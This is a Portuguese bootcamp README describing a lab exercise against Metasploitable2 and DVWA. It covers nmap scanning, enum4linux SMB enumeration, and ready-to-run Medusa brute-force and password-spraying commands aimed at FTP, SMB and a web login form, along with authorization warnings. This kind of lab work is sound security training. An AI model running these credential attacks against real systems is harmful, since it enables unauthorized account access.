# Bootcamp-Santander

# Projeto Bootcamp: Simulação Controlada de Ataques de Força Bruta com Medusa (Kali Linux)
**Autor:** Gabriel Lima

---

## ⚠️ Aviso de segurança e conformidade
Este repositório contém exemplos de execução de ataques de força bruta **apenas** para fins educacionais e de aprendizagem — realizados em um **ambiente de laboratório autorizado** (por exemplo, Metasploitable2). **É proibido** executar estes testes contra sistemas para os quais você não tenha permissão explícita. O uso indevido deste material pode ser crime.

---

## Descrição
Este projeto demonstra como usar a ferramenta **Medusa** (em Kali Linux) para executar testes controlados de força bruta em serviços como **FTP**, **SMB** e formulários **web (POST)**. Os exemplos foram executados em um ambiente de laboratório com alvos autorizados (Metasploitable2 / DVWA).

## Objetivo
- Mostrar a aplicabilidade de Medusa para testar senhas fracas.
- Demonstrar varredura e enumeração (com `nmap` e `enum4linux`) antes de testar credenciais.
- Executar ataques simulados em FTP, formulário web (DVWA) e SMB (password spraying/força bruta com lista de usuários).

## Escopo
- Serviços testados: FTP, SMB, Web (formulário POST).
- Ambiente: Máquina atacante (Kali Linux) e máquina alvo (Metasploitable2 / DVWA) em rede isolada.
- Limitação: testes de baixa escala e somente com listas de usuários/senhas controladas.

## Ferramentas utilizadas
- `medusa` — ferramenta de força bruta multi-protocolo
- `nmap` — varredura e descoberta de portas/serviços
- `enum4linux` — enumeração de serviços e usuários SMB

## Pré-requisitos
- Kali Linux atualizado
- Alvo de teste (por exemplo, Metasploitable2 ou máquina com DVWA) em rede isolada
- Arquivos de wordlists: `users.txt`, `smb_users.txt`, `pass.txt`, `senhas_spray.txt`
- Permissão por escrito para realizar os testes no(s) alvo(s)

---

## Estrutura de arquivos
```
README.md
wordlists/
  ├─ users.txt
  ├─ smb_users.txt
  ├─ pass.txt
  └─ senhas_spray.txt
results/
  └─ enum4_output.txt
```

---

## Procedimentos e comandos (exemplos)
> **Observação:** execute todos os comandos em um ambiente controlado e autorizado.

### 1. Varredura de portas com `nmap`
```bash
# Exemplo básico para identificar serviços
nmap -sV -p- 192.168.1.106
```

### 2. Enumeração SMB com `enum4linux`
```bash
# Enumeração completa (direcionada ao alvo em laboratório)
enum4linux -a 192.168.1.106 | tee results/enum4_output.txt
```

### 3. Ataque Web (formulário POST) com `medusa`
```bash
# Exemplo para DVWA: brute force via página de login (método HTTP POST)
medusa -h 192.168.1.111 -U wordlists/users.txt -P wordlists/pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6
```
Explicação rápida dos parâmetros:
- `-h`: host alvo
- `-U`: arquivo com usuários
- `-P`: arquivo com senhas
- `-M http`: módulo HTTP do Medusa
- `-m PAGE` / `-m FORM`: configurações do formulário
- `-m 'FAIL=...'`: string de falha para detectar login mal-sucedido
- `-t`: threads simultâneas

### 4. Ataque FTP com `medusa`
```bash
medusa -h 192.168.1.106 -U wordlists/users.txt -P wordlists/senhas_spray.txt -M ftp -t 2 -T 50
```
Parâmetros úteis:
- `-M ftp`: módulo FTP
- `-t`: número de threads por conexão (concorrência do módulo)
- `-T`: número total de threads (controle global)

### 5. Ataque SMB (password spraying / brute force)
```bash
# Após obter usuários via enum4linux, salve-os em wordlists/smb_users.txt
medusa -h 192.168.1.106 -U wordlists/smb_users.txt -P wordlists/senhas_spray.txt -M smbnt -t 2 -T 50
```
- `-M smbnt`: módulo SMB (NTLM)

---

## Interpretação dos resultados
- Verifique a saída do `medusa` para credenciais válidas. Registre descobertas em `results/`.
- Consulte `results/enum4_output.txt` para informações de usuários e serviços extraídas por `enum4linux`.

## Boas práticas e recomendações
- Execute testes somente em ambientes isolados e autorizados.
- Utilize wordlists responsáveis: evite listas massivas em redes compartilhadas para não causar impacto.
- Documente as permissões e resultados — guarde logs e relatórios para auditoria.
- Se descobrir credenciais fracas em ambientes reais autorizados, notifique as equipes responsáveis e recomende alteração das senhas e políticas de força.

---

## Referências e leituras úteis
- Documentação do Medusa: (consulte a documentação oficial do Kali / projeto Medusa)
- `enum4linux` README e exemplos
- `nmap` - guia de uso

---

## Licença
Este repositório é destinado a fins educacionais. Use por sua conta e responsabilidade e somente quando tiver autorização para testar os alvos.

---

**Contato:** Gabriel Lima

